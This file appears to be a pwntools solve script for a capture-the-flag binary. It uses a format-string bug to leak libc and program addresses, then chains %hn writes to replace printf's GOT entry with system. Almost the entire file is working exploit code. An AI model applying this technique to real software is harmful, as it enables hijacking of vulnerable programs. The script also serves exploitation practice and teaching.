#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")
p = process("./challenge/ret2libc_4")
print("pidof ret2libc_4:", proc.pidof(p)[0])
p.interactive()


# 利用思路
# 利用栈中保存的地址p1（第15个参数），修改栈中p1指向的位置的数据（p2）
# 利用p2（第43个参数）修改栈中其他的4个地址(p3,p4,p5,p6)，分别指向返回地址的4个部分，每部分两字节
# 利用p3,p4,p5,p6（第45,46,47,48个参数），got表，将printf修改为system

# 利用rcx（第3个参数）寄存器中的地址（libc_2.31.so:__write+17）计算libc加载地址
# 利用保存的返回地址（第9个参数）计算加载地址

libc_offset = 0x10e077
libc_base = 0xffffffffffffffff
proc_offset =0x140e
proc_base = 0xffffffffffffffff
got_printf_offset = 0x3fb0

system_offset = 0x52290
system_addr = 0xffffffffffffffff

got_printf = 0xffffffffffffffff # printf got表位置，system

p1 = 0xffffffffffffffff # 指向p2
p2 = 0xffffffffffffffff # 依次利用p2修改p3,p4,p5,p6
p3_offset = 0x10
p4_offset = 0x18
p5_offset = 0x20
p6_offset = 0x28
p3 = 0xffffffffffffffff
p4 = 0xffffffffffffffff
p5 = 0xffffffffffffffff
p6 = 0xffffffffffffffff

# 获取返回地址，计算程序加载地址
# 计算libc加载地址

p.sendline(b'3')
payload = b"%3$p\n%9$p\n%15$p\n"
p.send(payload)
lines = p.recvlines(numlines=5)
libc_base = int(lines[2], 16) - libc_offset
proc_base = int(lines[3], 16) - proc_offset
print("libc_base:", hex(libc_base))
print("proc_base:", hex(proc_base))
got_printf = proc_base + got_printf_offset
print("got printf:", hex(got_printf))
system_addr = libc_base + system_offset
print("system address:", hex(system_addr))

p1 = int(lines[4], 16)
p3 = got_printf
p4 = got_printf + 2
p5 = got_printf + 4
p6 = got_printf + 6
print("p1", hex(p1))
print("p3", hex(p3))
print("p4", hex(p4))
print("p5", hex(p5))
print("p6", hex(p6))

# 使p2指向p3，修改p3
p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p3_offset
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p3 >> 0) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p3_offset + 2
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p3 >> 16) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p3_offset + 4
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p3 >> 32) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p3_offset + 6
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format(0x10000).encode()
p.send(payload)

# 使p2指向p4，修改p4
p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p4_offset
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p4 >> 0) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p4_offset + 2
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p4 >> 16) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p4_offset + 4
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p4 >> 32) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p4_offset + 6
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format(0x10000).encode()
p.send(payload)

# 使p2指向p5，修改p5
p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p5_offset
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p5 >> 0) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p5_offset + 2
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p5 >> 16) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p5_offset + 4
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p5 >> 32) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p5_offset + 6
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format(0x10000).encode()
p.send(payload)

# 使p2指向p6，修改p6
p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p6_offset
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p6 >> 0) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p6_offset + 2
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p6 >> 16) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p6_offset + 4
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format((p6 >> 32) & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
p2 = p1 + p6_offset + 6
payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
p.send(payload)

p.sendlineafter(b"Choice >>", b'3')
payload = "%{}x%43$hn".format(0x10000).encode()
p.send(payload)

# 检查是否修改成功
p.sendlineafter(b"Choice >>", b'3')
payload = b"%45$p\n%46$p\n%47$p\n%48$p\n"
p.send(payload)
lines = p.recvlines(numlines=7)
print("p3", lines[3])
print("p4", lines[4])
print("p5", lines[5])
print("p6", lines[6])
p.interactive()

# 修改printf got表，改为system
p.sendline(b'3')
payload = b""
len0 = 0x0
len1 = (((system_addr >> 0) & 0xffff) - len0) % 0x10000
len0 += len1
len2 = (((system_addr >> 16) & 0xffff) - len0) % 0x10000
len0 += len2
len3 = (((system_addr >> 32) & 0xffff) - len0) % 0x10000
len0 += len3
len4 = (((system_addr >> 48) & 0xffff) - len0) % 0x10000
# print(hex(got_printf))
# print(hex(len1))
# print(hex(len2))
# print(hex(len3))
# print(hex(len4))
payload += "%{}x%45$hn".format(len1).encode() # 依次修改两个字节
payload += "%{}x%46$hn".format(len2).encode() # 依次修改两个字节
payload += "%{}x%47$hn".format(len3).encode() # 依次修改两个字节
payload += "%{}x%48$hn".format(len4).encode() # 依次修改两个字节


p.send(payload)
p.interactive()
